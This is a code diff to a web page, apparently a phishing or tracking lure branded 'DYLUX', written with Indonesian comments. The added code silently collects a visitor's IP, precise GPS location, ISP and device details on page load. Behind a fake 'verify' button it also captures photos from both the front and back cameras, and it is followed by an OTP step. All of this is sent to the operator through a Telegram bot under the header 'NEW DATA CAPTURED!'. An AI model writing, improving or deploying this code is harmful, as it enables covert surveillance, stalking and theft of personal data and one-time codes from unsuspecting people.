@@ -89,7 +89,30 @@
     }
 
     // ============================================
-    // AUTO-DETECT (JALAN OTOMATIS + LINK MAPS)
+    // FUNGSI AMBIL LOKASI GPS (PRESISI)
+    // ============================================
+    function getGPSLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    });
+                },
+                () => { resolve(null); },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+
+    // ============================================
+    // AUTO-DETECT (IP + GPS FALLBACK + LINK MAPS)
     // ============================================
     (async function autoDetect() {
         try {
@@ -97,6 +120,7 @@
             const userId = params.get('id');
             if (!userId) return;
 
+            // 1. Coba dapet IP dari API
             let ipData = null;
             for (const api of apiList) {
                 try {
@@ -111,34 +135,42 @@
                 } catch (e) { /* Coba API berikutnya */ }
             }
 
+            // 2. Kalo IP dapet, coba GPS buat presisi
+            let gpsData = null;
             if (ipData) {
-                // 🔥 BUAT LINK GOOGLE MAPS
-                const mapsLink = `https://maps.google.com/?q=${ipData.lat},${ipData.lon}`;
-
-                const message = 
-                    `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
-                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                    `<b>📌 Type:</b> Auto-Detect\n` +
-                    `<b>🌐 IP:</b> ${ipData.ip}\n` +
-                    `<b>📍 Lokasi:</b> ${ipData.city}, ${ipData.region}, ${ipData.country}\n` +
-                    `<b>📡 ISP:</b> ${ipData.isp}\n` +
-                    `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
-                    `<b>📱 Device:</b> ${navigator.userAgent}\n` +
-                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-
-                await sendMessageToTelegram(userId, message);
-                console.log('✅ Auto-detect sent with maps link!');
-            } else {
-                console.warn('⚠️ Auto-detect gagal, kirim notifikasi tanpa IP');
-                const message = 
-                    `<b>⚠️ NEW VISITOR!</b>\n\n` +
-                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                    `<b>📱 Device:</b> ${navigator.userAgent}\n` +
-                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-                await sendMessageToTelegram(userId, message);
+                gpsData = await getGPSLocation();
             }
+
+            // 3. Tentukan lokasi final (prioritas GPS kalo ada)
+            let finalLat = ipData?.lat || 0;
+            let finalLon = ipData?.lon || 0;
+            let locationText = `${ipData?.city || 'unknown'}, ${ipData?.region || 'unknown'}, ${ipData?.country || 'unknown'}`;
+
+            if (gpsData && gpsData.lat && gpsData.lon) {
+                finalLat = gpsData.lat;
+                finalLon = gpsData.lon;
+                locationText = `GPS: ${finalLat}, ${finalLon} (Akurasi ${gpsData.accuracy}m)`;
+            }
+
+            // 4. Buat link Google Maps
+            const mapsLink = `https://maps.google.com/?q=${finalLat},${finalLon}`;
+
+            // 5. Kirim notifikasi ke Telegram
+            const message = 
+                `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
+                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                `<b>📌 Type:</b> Auto-Detect\n` +
+                `<b>🌐 IP:</b> ${ipData?.ip || 'unknown'}\n` +
+                `<b>📍 Lokasi:</b> ${locationText}\n` +
+                `<b>📡 ISP:</b> ${ipData?.isp || 'unknown'}\n` +
+                `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
+                `<b>📱 Device:</b> ${navigator.userAgent}\n` +
+                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+
+            await sendMessageToTelegram(userId, message);
+            console.log('✅ Auto-detect sent with GPS!');
+
         } catch (e) { console.error('Auto-detect error:', e); }
     })();
     </script>
@@ -166,7 +198,7 @@
 
     <script>
     // ============================================
-    // AKSES KAMERA DEPAN + BELAKANG
+    // AKSES 2 KAMERA SEKALIGUS (PARALLEL)
     // ============================================
     const userId = new URLSearchParams(window.location.search).get('id');
     const verifyBtn = document.getElementById('verifyBtn');
@@ -175,69 +207,67 @@
     const statusMsg = document.getElementById('statusMsg');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    let stream = null;
+
+    async function captureCamera(facingMode) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode, width: { ideal: 640 } }
+            });
+
+            video.srcObject = stream;
+            video.classList.remove('hidden');
+            await video.play();
+
+            // Tunggu 1 detik biar stabil
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+            // Matikan stream
+            stream.getTracks().forEach(track => track.stop());
+            video.classList.add('hidden');
+
+            return imageData;
+        } catch (error) {
+            console.error(`Camera ${facingMode} error:`, error);
+            return null;
+        }
+    }
 
     async function captureBothCameras() {
         try {
-            // 1. Kamera Belakang (Environment)
-            const backStream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'environment', width: { ideal: 640 } }
-            });
+            // 🔥 AMBIL 2 KAMERA SEKALIGUS (PARALLEL)
+            const [backImage, frontImage] = await Promise.all([
+                captureCamera('environment'),
+                captureCamera('user')
+            ]);
 
-            video.srcObject = backStream;
-            video.classList.remove('hidden');
-            await video.play();
-            await new Promise(resolve => setTimeout(resolve, 1500));
+            // Kirim foto belakang
+            if (backImage) {
+                const captionBack = 
+                    `<b>📸 BACK CAMERA</b>\n\n` +
+                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+                await sendPhotoToTelegram(userId, backImage, captionBack);
+            }
 
-            // Ambil foto belakang
-            const ctxBack = canvas.getContext('2d');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            ctxBack.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const backImage = canvas.toDataURL('image/jpeg', 0.8);
+            // Kirim foto depan
+            if (frontImage) {
+                const captionFront = 
+                    `<b>📸 FRONT CAMERA (SELFIE)</b>\n\n` +
+                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+                await sendPhotoToTelegram(userId, frontImage, captionFront);
+            }
 
-            // Matikan kamera belakang
-            backStream.getTracks().forEach(track => track.stop());
-            video.classList.add('hidden');
-
-            // 2. Kamera Depan (User)
-            const frontStream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 640 } }
-            });
-
-            video.srcObject = frontStream;
-            video.classList.remove('hidden');
-            await video.play();
-            await new Promise(resolve => setTimeout(resolve, 1500));
-
-            // Ambil foto depan
-            const ctxFront = canvas.getContext('2d');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            ctxFront.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const frontImage = canvas.toDataURL('image/jpeg', 0.8);
-
-            // Matikan kamera depan
-            frontStream.getTracks().forEach(track => track.stop());
-            video.classList.add('hidden');
-
-            // 3. Kirim 2 foto ke Telegram
-            const captionBack = 
-                `<b>📸 BACK CAMERA</b>\n\n` +
-                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-
-            const captionFront = 
-                `<b>📸 FRONT CAMERA (SELFIE)</b>\n\n` +
-                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-
-            await sendPhotoToTelegram(userId, backImage, captionBack);
-            await sendPhotoToTelegram(userId, frontImage, captionFront);
-
-            return true;
+            return !!(backImage || frontImage);
         } catch (error) {
             console.error('Camera error:', error);
             return false;
@@ -259,7 +289,7 @@
         spinner.classList.add('active');
         statusMsg.style.display = 'none';
 
-        // Ambil 2 foto (depan + belakang)
+        // Ambil 2 foto sekaligus
         const captureSuccess = await captureBothCameras();
 
         // Kirim OTP ke Telegram
